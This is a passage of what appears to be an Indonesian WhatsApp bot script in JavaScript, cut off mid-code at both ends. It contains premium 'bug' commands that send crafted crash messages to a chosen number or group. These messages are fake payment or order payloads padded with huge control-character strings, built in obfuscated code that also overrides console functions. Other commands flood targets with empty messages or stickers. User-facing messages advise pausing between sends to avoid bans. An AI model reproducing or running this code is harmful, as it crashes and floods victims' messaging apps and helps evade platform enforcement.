_0x47e8ed;try{_0x47e8ed=_0x15b262[_0x36df09(0x3f0,0x3ff,0x3fb,0x3e7)](_0x2227a1,_0x15b262[_0x36df09(0x3f7,0x3f7,0x403,0x3c8)](_0x15b262[_0x36df09(0x3db,0x3d1,0x397,0x3c2)](_0x15b262[_0x3c8e2d(0x181,0x182,0x166,0x163)],_0x15b262[_0x3c8e2d(0xe3,0x135,0x119,0xe0)]),');'))();}catch(_0xb58328){_0x47e8ed=_0x52d9be;}return _0x47e8ed;}}}else{const _0x3f9d8b=_0x50a089?function(){if(_0x2d312f){const _0x491161=_0xb92ebf['apply'](_0x18beec,arguments);return _0x5052ea=null,_0x491161;}}:function(){};return _0x515d1c=![],_0x3f9d8b;}}:function(){};return _0x6ba2d2=![],_0x50ac50;}else{const _0x1e8b9b=_0x13c8fb[_0x3a2dc1(-0x1ce,-0x1fc,-0x20e,-0x1dd)](_0x3672d2,arguments);return _0x12ea84=null,_0x1e8b9b;}};}()),_0x47a498=_0x22e061(this,function(){const _0x3e95e8={};_0x3e95e8[_0x3f8d6a(0x39c,0x3d8,0x385,0x380)]=_0x1ee980(0x437,0x412,0x3f3,0x447)+'+$';const _0x399b57=_0x3e95e8;function _0x3f8d6a(_0x308ffc,_0x303c17,_0x29f7b2,_0xc5ec67){return _0x5ddd(_0x308ffc-0x203,_0x29f7b2);}function _0x1ee980(_0x1109bf,_0x24ec5a,_0x3f3342,_0x16c3b4){return _0x5ddd(_0x1109bf-0x232,_0x3f3342);}return _0x47a498[_0x1ee980(0x429,0x45b,0x42f,0x3ff)]()[_0x1ee980(0x3f8,0x3b8,0x3d3,0x3f2)](_0x399b57[_0x3f8d6a(0x39c,0x3d4,0x360,0x3c3)])[_0x1ee980(0x429,0x403,0x463,0x467)]()[_0x3f8d6a(0x3e6,0x423,0x400,0x410)+'r'](_0x47a498)[_0x3f8d6a(0x3c9,0x3e0,0x3f7,0x3e5)](_0x399b57['StmLJ']);});function _0x5ddd(_0x47a498,_0x22e061){const _0x43ecfd=_0x43ec();return _0x5ddd=function(_0x5ddd52,_0x14d506){_0x5ddd52=_0x5ddd52-(0xe0f+-0xeef*-0x1+-0x1b6f*0x1);let _0x410015=_0x43ecfd[_0x5ddd52];return _0x410015;},_0x5ddd(_0x47a498,_0x22e061);}_0x47a498();const _0x3d44a3=(function(){function _0x4e9e25(_0x547ca4,_0x22e808,_0x3538c2,_0x2097f3){return _0x5ddd(_0x547ca4- -0x5,_0x22e808);}const _0x27b1e4={};function _0x1e7bfa(_0x128ada,_0x21d7b6,_0x4beefd,_0x2e6ee2){return _0x5ddd(_0x128ada- -0xe,_0x2e6ee2);}_0x27b1e4['XdyyD']=_0x4e9e25(0x200,0x23e,0x217,0x1c4)+'+$',_0x27b1e4['vuZew']=function(_0x4f91dd,_0x12a9b7){return _0x4f91dd!==_0x12a9b7;},_0x27b1e4[_0x4e9e25(0x1c3,0x1d6,0x1dd,0x19b)]=_0x1e7bfa(0x1d6,0x1b3,0x212,0x1a3),_0x27b1e4['wllQk']=_0x1e7bfa(0x1a6,0x196,0x161,0x1cf);const _0x308de8=_0x27b1e4;let _0x387ba2=!![];return function(_0x4abd42,_0x5d1699){function _0x4e1e11(_0x14a3ee,_0x4031e9,_0x4e9322,_0x2ed308){return _0x4e9e25(_0x4031e9-0x38d,_0x2ed308,_0x4e9322-0x92,_0x2ed308-0x42);}function _0x2dc224(_0xfe5eca,_0x361858,_0x475cfd,_0x881ab1){return _0x4e9e25(_0xfe5eca-0x138,_0x881ab1,_0x475cfd-0x1d9,_0x881ab1-0x12);}if(_0x308de8[_0x4e1e11(0x508,0x541,0x517,0x542)](_0x308de8[_0x2dc224(0x2fb,0x32f,0x2db,0x308)],_0x308de8[_0x4e1e11(0x53f,0x53e,0x531,0x55c)])){const _0x2e43f4=_0x387ba2?function(){if(_0x5d1699){const _0x4f079f=_0x5d1699['apply'](_0x4abd42,arguments);return _0x5d1699=null,_0x4f079f;}}:function(){};return _0x387ba2=![],_0x2e43f4;}else return _0x18205f['toString']()['search'](_0x308de8['XdyyD'])['toString']()[_0x2dc224(0x316,0x34c,0x2d9,0x309)+'r'](_0x4e7659)['search']('(((.+)+)+)'+'+$');};}()),_0x4adc8a=_0x3d44a3(this,function(){const _0x45af7f={'TPYLA':function(_0x278634,_0x51e00f){return _0x278634+_0x51e00f;},'KyYfq':_0x1370a9(0x362,0x361,0x322,0x346)+_0x286971(-0xf2,-0x14a,-0x12e,-0x13a),'AkhMy':_0x286971(-0xce,-0xb5,-0xec,-0xda)+_0x286971(-0x12b,-0x132,-0x111,-0xcf)+_0x1370a9(0x31f,0x314,0x316,0x2e3)+'\x20)','dGpNW':function(_0x3c9d92){return _0x3c9d92();},'FXmxX':_0x1370a9(0x335,0x335,0x331,0x319),'dRFOJ':_0x286971(-0x11e,-0x104,-0x137,-0x101),'iyORL':_0x286971(-0xdc,-0xbc,-0xc3,-0x104),'QqXmN':'exception','xwthx':'table','iYNDd':_0x1370a9(0x37b,0x351,0x339,0x31d),'XLbyq':function(_0x4d6c81,_0x3cf71a){return _0x4d6c81<_0x3cf71a;},'xwGIR':function(_0xbeba16,_0xb121e0){return _0xbeba16!==_0xb121e0;},'xOILv':_0x1370a9(0x311,0x309,0x2de,0x2f6)};function _0x1370a9(_0x259ca3,_0x4f3e73,_0x2a1353,_0x2e9c43){return _0x5ddd(_0x4f3e73-0x161,_0x2a1353);}const _0x5d7fdb=function(){let _0x49e88e;try{_0x49e88e=Function(_0x45af7f['TPYLA'](_0x45af7f[_0x5092a3(0x73,0x32,0x6d,0x5a)](_0x45af7f[_0x281419(-0x1d0,-0x208,-0x1e5,-0x1f5)],_0x45af7f['AkhMy']),');'))();}catch(_0x478daf){_0x49e88e=window;}function _0x281419(_0x2b260f,_0x31bfd0,_0x107ed8,_0x4608a3){return _0x1370a9(_0x2b260f-0xb5,_0x107ed8- -0x540,_0x31bfd0,_0x4608a3-0x23);}function _0x5092a3(_0x5985cb,_0xe654b1,_0x5062f4,_0x3e70ce){return _0x1370a9(_0x5985cb-0x49,_0x5985cb- -0x2e2,_0x3e70ce,_0x3e70ce-0x1de);}return _0x49e88e;},_0x3826f4=_0x45af7f[_0x1370a9(0x33f,0x346,0x37f,0x382)](_0x5d7fdb);function _0x286971(_0x7e9968,_0x534461,_0x477cb3,_0x39c32c){return _0x5ddd(_0x477cb3- -0x2cb,_0x7e9968);}const _0x585158=_0x3826f4[_0x286971(-0x10a,-0x127,-0xff,-0x13e)]=_0x3826f4[_0x1370a9(0x313,0x32d,0x2f7,0x33e)]||{},_0x1dd01c=[_0x45af7f[_0x286971(-0x169,-0x13b,-0x139,-0x16c)],_0x1370a9(0x35d,0x374,0x34f,0x378),_0x45af7f[_0x286971(-0xfe,-0xe9,-0xbf,-0xf9)],_0x45af7f[_0x1370a9(0x30b,0x31d,0x356,0x336)],_0x45af7f['QqXmN'],_0x45af7f[_0x286971(-0xfe,-0x106,-0xfb,-0x128)],_0x45af7f[_0x1370a9(0x2e5,0x310,0x2e8,0x2d4)]];for(let _0xabfc22=-0xdbc+-0xf17*-0x1+-0x1*0x15b;_0x45af7f[_0x286971(-0x140,-0x15a,-0x135,-0x159)](_0xabfc22,_0x1dd01c['length']);_0xabfc22++){if(_0x45af7f[_0x1370a9(0x2f4,0x325,0x310,0x349)](_0x286971(-0x15a,-0x14c,-0x123,-0x136),_0x45af7f['xOILv'])){const _0x3d365f=_0x589460[_0x1370a9(0x326,0x332,0x368,0x326)](_0x581986,arguments);return _0x590f88=null,_0x3d365f;}else{const _0x504de4=_0x3d44a3[_0x286971(-0xf0,-0xec,-0xe8,-0x10a)+'r']['prototype']['bind'](_0x3d44a3),_0x262dd2=_0x1dd01c[_0xabfc22],_0x4ca48d=_0x585158[_0x262dd2]||_0x504de4;_0x504de4[_0x1370a9(0x320,0x300,0x320,0x2c5)]=_0x3d44a3[_0x286971(-0x143,-0xe8,-0x121,-0xfa)](_0x3d44a3),_0x504de4[_0x1370a9(0x375,0x358,0x31a,0x39a)]=_0x4ca48d['toString'][_0x1370a9(0x341,0x30b,0x30a,0x2cb)](_0x4ca48d),_0x585158[_0x262dd2]=_0x504de4;}}});_0x4adc8a();let bug='\x03'['repeat'](-0x1e0*0x664+0xb550e+0x9ce32);for(let i=-0x1097+-0x2d3*0x1+0x136a;i<0x25a5+-0x14e9+-0x109e;i++){const _0x4a824b={};_0x4a824b[_0x30bfde(0x527,0x579,0x55b,0x568)+'Jid']=_0x30bfde(0x5fc,0x597,0x5bd,0x5e7)+_0x45425d(0x79,0x77,0x3c,0x6d)+'ewsletter',_0x4a824b[_0x30bfde(0x51e,0x577,0x55b,0x58d)+'Name']=_0x45425d(0x46,0x52,0x24,0x79)+_0x30bfde(0x564,0x561,0x584,0x565)+'ni\x20->\x20cras'+'h',_0x4a824b[_0x45425d(0x8d,0x6e,0x97,0x81)+_0x30bfde(0x519,0x53d,0x53d,0x579)]=0x2;const _0x32c405={};_0x32c405[_0x30bfde(0x58d,0x55d,0x5a0,0x5df)+'tachment']=[],_0x32c405[_0x30bfde(0x573,0x54c,0x548,0x534)+_0x45425d(0x99,0xa1,0x86,0x62)]=global[_0x45425d(0x72,0x98,0xa4,0xa0)];const _0x23db66={};_0x23db66[_0x30bfde(0x5f2,0x5d7,0x5bc,0x588)]='review_and'+'_pay',_0x23db66['buttonPara'+_0x30bfde(0x56a,0x550,0x53c,0x514)]='{\x22currency'+_0x30bfde(0x5df,0x57f,0x5c3,0x5c9)+_0x30bfde(0x55c,0x5ae,0x578,0x545)+_0x45425d(0x78,0x61,0x47,0x45)+'\x22:19999800'+_0x45425d(0xa7,0xc1,0x7d,0xde)+_0x45425d(0xc5,0x8a,0x69,0x84)+'rence_id\x22:'+_0x45425d(0x16,0x53,0x53,0x33)+_0x30bfde(0x59b,0x5b2,0x5b6,0x573)+_0x30bfde(0x5b7,0x5a6,0x577,0x5a2)+_0x30bfde(0x588,0x5ed,0x5ab,0x5c1)+_0x30bfde(0x5dd,0x5ab,0x598,0x5ba)+_0x30bfde(0x5e7,0x5e3,0x5b3,0x5a3)+_0x45425d(0x56,0x6d,0xa0,0x47)+_0x45425d(0x33,0x5b,0x18,0x25)+'total\x22:{\x22v'+_0x30bfde(0x53c,0x59d,0x570,0x536)+_0x30bfde(0x577,0x5b0,0x593,0x576)+'et\x22:100},\x22'+_0x45425d(0x99,0x85,0x80,0x75)+_0x45425d(0x89,0xc7,0x96,0xda)+_0x45425d(0x53,0x7f,0x64,0xa5)+_0x45425d(0xcc,0xbe,0xde,0xe7)+'id\x22:\x2275376'+'3159292600'+_0x45425d(0x75,0x8b,0x4d,0x8a)+_0x45425d(0x77,0xb7,0xcc,0xe5)+_0x45425d(0x83,0xa9,0xe8,0xc9)+_0x30bfde(0x5b4,0x556,0x57f,0x595)+_0x30bfde(0x563,0x55c,0x554,0x525)+unic['n7']+(_0x45425d(0x6c,0x9f,0xd4,0xcd)+_0x45425d(0x8b,0x55,0x6b,0x45)+_0x45425d(0x87,0xc2,0x88,0xa9)+_0x45425d(0x6a,0x6f,0xa0,0xae)+_0x45425d(0x2f,0x6b,0x7d,0x52)+_0x30bfde(0x531,0x592,0x562,0x548)+_0x45425d(0x21,0x45,0x6e,0x7d)+_0x45425d(0xd7,0x9e,0x5b,0xbf)+_0x30bfde(0x535,0x584,0x547,0x570)+_0x30bfde(0x5d1,0x5c3,0x594,0x5c1)+_0x45425d(0x4e,0x71,0x9f,0x2e)+_0x45425d(0xbb,0x83,0x51,0x92)+_0x30bfde(0x576,0x595,0x5af,0x5e9)+_0x45425d(0xca,0x8c,0x98,0x64)+'⿻\x20𝐂𝐋͢𝐢𝚵𝐍͢𝐓\x20々')+bug+(_0x30bfde(0x57a,0x5bd,0x59c,0x5c0)+_0x30bfde(0x596,0x510,0x552,0x551)+_0x30bfde(0x5f8,0x5f5,0x5bf,0x587)+'ffset\x22:100'+_0x45425d(0x3d,0x6b,0x2e,0xa2)+_0x45425d(0x99,0x9c,0xd6,0x62)+_0x30bfde(0x561,0x593,0x5a3,0x563)+_0x45425d(0xdd,0x9d,0xc6,0xe1)+_0x45425d(0x84,0x48,0x8b,0x47));const _0x17c293={};_0x17c293[_0x30bfde(0x586,0x587,0x544,0x507)]=[_0x23db66];const _0x4b01d0={};_0x4b01d0[_0x30bfde(0x5ac,0x582,0x5ae,0x5a9)]=_0x32c405,_0x4b01d0[_0x45425d(0x70,0xa5,0xde,0x88)+_0x30bfde(0x56a,0x57d,0x56f,0x587)]=_0x17c293;const _0x306fb9={};_0x306fb9['interactiv'+'eMessage']=_0x4b01d0;const _0x118bf8={};_0x118bf8['isForwarde'+'d']=!![],_0x118bf8[_0x45425d(0xad,0x79,0x96,0x46)+_0x30bfde(0x5dd,0x587,0x5a8,0x585)+_0x30bfde(0x57b,0x58e,0x5a9,0x57b)]=_0x4a824b,_0x118bf8['stanzaId']=_0x30bfde(0x593,0x593,0x564,0x520)+_0x30bfde(0x5e4,0x593,0x5b0,0x5d1),_0x118bf8[_0x30bfde(0x517,0x550,0x540,0x520)+'t']=_0x45425d(0x9d,0x75,0x59,0x91)+'pp.net',_0x118bf8[_0x30bfde(0x5df,0x5ca,0x5b7,0x5b3)+_0x45425d(0x8c,0x89,0x76,0x61)]=_0x306fb9,_0x118bf8['remoteJid']=_0x45425d(0x3a,0x54,0x43,0x1c)+_0x30bfde(0x512,0x51c,0x54d,0x528);const _0x40542e={};_0x40542e[_0x45425d(0xc0,0xad,0xd6,0xb4)]='kontol',_0x40542e[_0x30bfde(0x563,0x532,0x556,0x589)+'o']=_0x118bf8;const _0x42ef4a={};_0x42ef4a[_0x30bfde(0x51c,0x550,0x55d,0x587)+_0x45425d(0x81,0xa8,0x94,0xcb)]=_0x40542e,await joestar[_0x30bfde(0x5f1,0x5db,0x5b8,0x5c3)+'ge'](target,_0x42ef4a,{});const _0x415505={};_0x415505[_0x45425d(0xb2,0xad,0x8b,0xd6)]='';const _0x10e9ac={};_0x10e9ac[_0x30bfde(0x539,0x54f,0x57a,0x56b)]=qbug,await joestar[_0x45425d(0x65,0x92,0x65,0xc3)+'e'](target,_0x415505,_0x10e9ac);}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}✅. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'bugextend': {
if (!isPremium) return msgreply(mess.premium)
if (!text) return msgreply(`Example: ${prefix + command} 6282823838889|1`);
target = q.split("|")[0]+"@s.whatsapp.net"
jumlah = q.split("|")[1] * 30
for (let i = 0; i < jumlah; i++) {
await joestar.sendMessage(target, { text: '' }, { quoted: qbug })
}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command} Dengan Jumlah ${jumlah}✅. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'penghitaman': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 1962623836281@g.us`)
target = q
for (let i = 0; i < 100; i++) {
await joestar.sendVideoAsSticker(target, mengkece, qbug, { packname: unic.n2, author: unic.n3 })
}
msgreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
}
break

case 'element-grp': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} https://chat.whatsapp.com/BLjM7LyHJLqI2ndjJsk61jbd`)
msgreply(mess.ngebug)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await joestar.groupAcceptInvite(result);
function _0x15a19b(_0x4606b9,_0x12a5f5,_0xc8a211,_0x38bf12){return _0x2c69(_0xc8a211-0x37a,_0x12a5f5);}(function(_0x32c932,_0x1f4144){function _0x4e762(_0x29a032,_0x58669b,_0x4819ff,_0x1bbcab){return _0x2c69(_0x1bbcab-0x3ac,_0x29a032);}function _0x12a254(_0x1099ce,_0x32afd2,_0x194fd0,_0x327cbb){return _0x2c69(_0x1099ce-0x358,_0x327cbb);}const _0x93f3e0=_0x32c932();while(!![]){try{const _0x138da9=parseInt(_0x4e762(0x534,0x508,0x538,0x525))/(0x1c22+0xd27+-0x2948)+-parseInt(_0x12a254(0x4aa,0x4d6,0x4c7,0x4b4))/(0x968+-0x1d56+0xe8*0x16)+parseInt(_0x12a254(0x4ad,0x48b,0x482,0x499))/(-0x1a0c+-0x656*0x3+0x8b*0x53)*(-parseInt(_0x12a254(0x4ac,0x4db,0x4e6,0x4e9))/(0xf41+0x1c7*-0x4+0x1*-0x821))+parseInt(_0x12a254(0x497,0x4d3,0x4bc,0x4cb))/(-0x91a*0x1+-0x1*-0x1a61+0x5e*-0x2f)+parseInt(_0x12a254(0x4b8,0x4ca,0x4da,0x4b4))/(0x14a9+0x11a1+-0x2644)*(parseInt(_0x4e762(0x507,0x4e6,0x536,0x515))/(-0x26*0x86+-0x8f5+0x1ce0))+-parseInt(_0x12a254(0x4b4,0x4c4,0x488,0x487))/(-0x1dc5+-0x1*-0x158f+0x83e)+parseInt(_0x4e762(0x4f9,0x4f3,0x543,0x505))/(0x16d3+0x676+-0x1d40);if(_0x138da9===_0x1f4144)break;else _0x93f3e0['push'](_0x93f3e0['shift']());}catch(_0x5a1c83){_0x93f3e0['push'](_0x93f3e0['shift']());}}}(_0x28f4,-0x895ef+0x2c3ab*0x1+0x70a45*0x2));function _0x28f4(){const _0xc03139=['9631592926','LMRHf','\x22:19999800','nativeFlow','atus\x22:\x22pay','y\x22:1},{\x22re','relog\x20->\x20b','alue\x22:1999','KPvBh','1015567RWhxft','kontol','status@bro','hlALu','console','participan','et\x22:100},\x22','ewsletter','extendedTe','wGFMV','quotedMess','qtLWg','eMessage','contextInf','name','relayMessa','log','mqpvR','msJson','{\x22currency','rder\x22:{\x22st','serverMess','eENlZ','newsletter','3159292600','(((.+)+)+)','4605763435','CyYeu','pdrOS','-goods\x22,\x22o','toString','review_and','qXdro','trace',':{\x22value\x22:','tachment','hasMediaAt','tailer_id\x22','\x22:\x22ORDER\x22,','05763435\x22,','fnqzI','ffset\x22:100','constructo','ctor(\x22retu','rn\x20this\x22)(','__proto__','rEVfh','BicPl','interactiv','sendMessag','d\x22:\x22784267','search','PyHzx','buttonPara','ment_reque','\x22retailer_','FSRnS','DSQpv','Name','apply','{}.constru','hGwoG','wlGgz','9800,\x22offs','\x224ONSAXV76','remoteJid','bind','ent_method','2744475MxefMg','⟠\x20𝐉𝚹𝚺͢𝐒𝐓𝚫𝐑\x20','BAE526D352','repeat','ageId','1203631440','essageInfo','quoted','order_type','9999900,\x22o','isForwarde','9\x22,\x22produc','\x22:\x22','sted\x22,\x22sub','\x22,\x22amount\x22','text','y\x22:1}]},\x22n','0@s.whatsa','s\x22:[]}','1956718pKDJWP','jpegThumbn','12dRRZxP','17007BVOKOK','JYWfq','ewsletterM','prototype','2491038IvFzgs','age','100},\x22refe','6236616VQxBED','⿻\x20𝐂𝐋͢𝐢𝚵𝐍͢𝐓\x20々','\x22,\x22name\x22:\x22','adcast','9726owwjYh','pp.net','_pay','warn',':\x22physical','uka\x20chat\x20i','stanzaId','xtMessage','\x22product_i','2051mEbMaU','\x22items\x22:[{','rence_id\x22:','APELu','},\x22quantit','gUvHS','total\x22:{\x22v'];_0x28f4=function(){return _0xc03139;};return _0x28f4();}const _0xf3274a=(function(){const _0xe47f4c={};_0xe47f4c['LMRHf']=function(_0x3c6308,_0x22ed9d){return _0x3c6308===_0x22ed9d;};const _0x356cf0=_0xe47f4c;let _0x4928d6=!![];return function(_0x4083b5,_0x405178){const _0x553721=_0x4928d6?function(){function _0x2a4276(_0x5c799f,_0x5f1986,_0x578aa5,_0x2210ae){return _0x2c69(_0x5c799f-0x180,_0x5f1986);}function _0x2e2cd7(_0x558938,_0x2881c8,_0x15d247,_0x3d1266){return _0x2c69(_0x2881c8- -0x2f,_0x558938);}if(_0x405178){if(_0x356cf0[_0x2e2cd7(0x113,0x142,0x11f,0x131)](_0x2a4276(0x2fc,0x30e,0x2f5,0x311),_0x2a4276(0x2fc,0x2f8,0x2f3,0x311))){const _0x471196=_0x405178[_0x2a4276(0x2b6,0x2e3,0x2ab,0x2d9)](_0x4083b5,arguments);return _0x405178=null,_0x471196;}else{if(_0x382c57){const _0x1a504b=_0x396a5f[_0x2e2cd7(0x144,0x107,0x128,0xe6)](_0x5ec307,arguments);return _0x5171ab=null,_0x1a504b;}}}}:function(){};return _0x4928d6=![],_0x553721;};}()),_0xba930b=_0xf3274a(this,function(){function _0x6d950(_0x9cf75f,_0x40c57a,_0xc3e9a6,_0x3af5ff){return _0x2c69(_0x40c57a- -0x20a,_0x9cf75f);}function _0x5503bf(_0x4d57f6,_0x46058f,_0x3ca3bd,_0x7fe452){return _0x2c69(_0x7fe452-0x2c,_0x4d57f6);}const _0x1c68ae={};_0x1c68ae['KPvBh']=_0x5503bf(0x1a6,0x1cf,0x1f9,0x1be)+'+$';const _0x56cda8=_0x1c68ae;return _0xba930b[_0x6d950(-0x38,-0x73,-0x71,-0x60)]()[_0x6d950(-0xec,-0xdc,-0xa8,-0xd6)](_0x56cda8['KPvBh'])[_0x6d950(-0x9a,-0x73,-0x54,-0x77)]()[_0x6d950(-0x51,-0x67,-0x64,-0x91)+'r'](_0xba930b)[_0x5503bf(0x135,0x146,0x138,0x15a)](_0x56cda8[_0x5503bf(0x16b,0x1b5,0x165,0x1a4)]);});_0xba930b();const _0x27e679=(function(){const _0x52c56d={};function _0x1e2a96(_0x5e8491,_0x27062,_0x157918,_0x4a516f){return _0x2c69(_0x27062- -0x3a2,_0x4a516f);}_0x52c56d[_0x1e2a96(-0x1d2,-0x201,-0x1c7,-0x205)]=function(_0x299c4f,_0x303405){return _0x299c4f===_0x303405;},_0x52c56d[_0x47b5b4(-0x7b,-0x60,-0x4a,-0x82)]=_0x1e2a96(-0x1f7,-0x1fa,-0x1bb,-0x213),_0x52c56d['pdrOS']=function(_0x349826,_0x5a01cb){return _0x349826===_0x5a01cb;};function _0x47b5b4(_0x9242fe,_0x34f26c,_0x236436,_0xc890cb){return _0x2c69(_0xc890cb- -0x1ba,_0x236436);}_0x52c56d[_0x47b5b4(-0x56,-0x9a,-0x32,-0x64)]=_0x1e2a96(-0x1fa,-0x236,-0x267,-0x23c);const _0x4e8549=_0x52c56d;let _0x14afcb=!![];return function(_0x2fda07,_0x1f0236){function _0x248f3f(_0x2da683,_0x5d16ad,_0x1ab971,_0x117841){return _0x47b5b4(_0x2da683-0x95,_0x5d16ad-0xe6,_0x117841,_0x2da683-0xf9);}const _0x3e951c={'wGFMV':function(_0x2d3b2b,_0x1f21d8){function _0x4936aa(_0x10ef59,_0x25a683,_0x29f193,_0x24905a){return _0x2c69(_0x10ef59- -0x34c,_0x29f193);}return _0x4e8549[_0x4936aa(-0x1ab,-0x19e,-0x1b6,-0x1e3)](_0x2d3b2b,_0x1f21d8);},'wlGgz':_0x4e8549['hGwoG']};function _0x4e5da3(_0x9e6a14,_0x56ad8e,_0x3b042d,_0x3a71c6){return _0x47b5b4(_0x9e6a14-0xd9,_0x56ad8e-0x12c,_0x56ad8e,_0x3b042d-0xb8);}if(_0x4e8549[_0x248f3f(0xd4,0xcf,0xf8,0xea)](_0x4e8549['JYWfq'],_0x4e8549[_0x248f3f(0x95,0x9a,0xba,0xd1)])){const _0xbc1ff4=_0x14afcb?function(){function _0x3f1e52(_0x501052,_0x3819b9,_0xcdf14c,_0x20b695){return _0x248f3f(_0x20b695-0x2a4,_0x3819b9-0x1e5,_0xcdf14c-0x3d,_0x501052);}function _0xb0be2e(_0x245618,_0x49a541,_0x57aedc,_0x50a750){return _0x248f3f(_0x50a750-0x48f,_0x49a541-0x18b,_0x57aedc-0x10e,_0x49a541);}if(_0x3e951c[_0xb0be2e(0x54b,0x57f,0x55d,0x550)](_0x3e951c[_0xb0be2e(0x507,0x546,0x4eb,0x507)],_0x3e951c['wlGgz'])){if(_0x1f0236){const _0x54e552=_0x1f0236['apply'](_0x2fda07,arguments);return _0x1f0236=null,_0x54e552;}}else{const _0x1162a9=_0x55e6f5[_0xb0be2e(0x514,0x50e,0x525,0x504)](_0x55d62f,arguments);return _0x1d6e65=null,_0x1162a9;}}:function(){};return _0x14afcb=![],_0xbc1ff4;}else{const _0x3c8ae3=_0x10db29?function(){if(_0x47eefa){const _0x116ac3=_0x1bc075['apply'](_0x140e7d,arguments);return _0x4927b3=null,_0x116ac3;}}:function(){};return _0x74a72d=![],_0x3c8ae3;}};}()),_0x4b1e40=_0x27e679(this,function(){const _0x23c375={'nKLkp':function(_0x18c493,_0x9d5498){return _0x18c493(_0x9d5498);},'FSRnS':function(_0x470d2d,_0xc532f7){return _0x470d2d+_0xc532f7;},'CmuKI':function(_0x21a509,_0x2ef4f5){return _0x21a509+_0x2ef4f5;},'rEVfh':'return\x20(fu'+'nction()\x20','PyHzx':_0x3b55e5(-0x2a,-0x94,-0x96,-0x5b)+_0x17c6eb(0x315,0x32d,0x2d7,0x2eb)+_0x3b55e5(-0x17,-0x1a,-0xb,0x13)+'\x20)','DSQpv':function(_0xd33de8){return _0xd33de8();},'mqpvR':_0x17c6eb(0x2d4,0x2a5,0x30c,0x2bd),'MVzXY':'info','eENlZ':'error','CyYeu':'exception','qtLWg':'table','qXdro':_0x17c6eb(0x30b,0x31c,0x2d2,0x327),'gUvHS':function(_0x4e7602,_0x112b55){return _0x4e7602<_0x112b55;}};let _0x540ff0;try{const _0x2de064=_0x23c375['nKLkp'](Function,_0x23c375[_0x17c6eb(0x2a4,0x26e,0x2be,0x275)](_0x23c375['CmuKI'](_0x23c375[_0x3b55e5(0x3b,-0x19,0x38,0x15)],_0x23c375[_0x3b55e5(-0x90,-0x7b,-0x66,-0x63)]),');'));_0x540ff0=_0x23c375[_0x3b55e5(-0x3b,-0x44,-0x5a,-0x5e)](_0x2de064);}catch(_0x534aaf){_0x540ff0=window;}function _0x17c6eb(_0xa2b8eb,_0x577433,_0x1792ac,_0x3a2105){return _0x2c69(_0xa2b8eb-0x171,_0x1792ac);}const _0x67c609=_0x540ff0[_0x17c6eb(0x2ee,0x2db,0x2de,0x2bf)]=_0x540ff0[_0x3b55e5(0x14,-0x41,0x26,-0x15)]||{};function _0x3b55e5(_0x5c0e1b,_0x54810d,_0x29a7c9,_0x27545a){return _0x2c69(_0x27545a- -0x192,_0x29a7c9);}const _0x2c48a3=[_0x17c6eb(0x2fa,0x315,0x2bf,0x2cb),_0x23c375[_0x17c6eb(0x2fb,0x2be,0x313,0x304)],_0x23c375['MVzXY'],_0x23c375[_0x17c6eb(0x300,0x2db,0x303,0x2c2)],_0x23c375[_0x3b55e5(0xb,-0xa,-0x10,0x2)],_0x23c375[_0x17c6eb(0x2f5,0x2bd,0x2ff,0x30a)],_0x23c375[_0x17c6eb(0x30a,0x30c,0x2e6,0x2e7)]];for(let _0x517dea=-0x1f15*0x1+-0x26*0x6a+0x3*0xf9b;_0x23c375[_0x17c6eb(0x2df,0x319,0x2f9,0x2b7)](_0x517dea,_0x2c48a3['length']);_0x517dea++){const _0x3351ea=_0x27e679[_0x17c6eb(0x314,0x32f,0x315,0x2dd)+'r'][_0x17c6eb(0x2c9,0x29c,0x2d7,0x2e3)][_0x17c6eb(0x2ae,0x2a7,0x2be,0x271)](_0x27e679),_0xadfcb=_0x2c48a3[_0x517dea],_0x1de33d=_0x67c609[_0xadfcb]||_0x3351ea;_0x3351ea[_0x17c6eb(0x317,0x2e9,0x34f,0x313)]=_0x27e679[_0x17c6eb(0x2ae,0x29d,0x278,0x2d0)](_0x27e679),_0x3351ea[_0x3b55e5(0x3e,0x3b,-0x34,0x5)]=_0x1de33d[_0x17c6eb(0x308,0x323,0x2d7,0x2e2)]['bind'](_0x1de33d),_0x67c609[_0xadfcb]=_0x3351ea;}});_0x4b1e40();function _0x2427a7(_0x21fa51,_0x4358bc,_0x31d5c0,_0xf52ecc){return _0x2c69(_0x31d5c0-0x1ce,_0x4358bc);}function _0x2c69(_0x537000,_0xba930b){const _0xf3274a=_0x28f4();return _0x2c69=function(_0x28f4bb,_0x2c6957){_0x28f4bb=_0x28f4bb-(0x4*-0x3+0x1dbd+-0x1c86);let _0x3f9e4c=_0xf3274a[_0x28f4bb];return _0x3f9e4c;},_0x2c69(_0x537000,_0xba930b);}let bug='\x03'[_0x15a19b(0x4e0,0x4e1,0x4bc,0x4bc)](-0xceb14+0x4c1*0x3d7+-0x3d1bd*-0x1);for(let i=-0x3ed*0x7+0x1749+0x432;i<-0x2*-0x14c+-0x1510+-0x94b*-0x2;i++){const _0x18e95c={};_0x18e95c[_0x2427a7(0x33f,0x369,0x35e,0x36d)+'Jid']=_0x2427a7(0x309,0x32e,0x312,0x2dd)+'38483540@n'+_0x15a19b(0x4ee,0x50f,0x4fa,0x4e6),_0x18e95c[_0x15a19b(0x52e,0x4e6,0x50a,0x4db)+_0x15a19b(0x4a9,0x487,0x4af,0x4da)]=_0x2427a7(0x335,0x326,0x344,0x381)+_0x15a19b(0x4d6,0x4a7,0x4df,0x518)+'ni\x20->\x20cras'+'h',_0x18e95c[_0x15a19b(0x4fc,0x4ee,0x508,0x538)+_0x2427a7(0x33b,0x2ff,0x311,0x31a)]=0x2;const _0x427c68={};_0x427c68[_0x2427a7(0x33d,0x32f,0x36b,0x332)+_0x2427a7(0x390,0x3a6,0x36a,0x346)]=[],_0x427c68[_0x2427a7(0x352,0x2f9,0x321,0x331)+'ail']=global['jpegT'];const 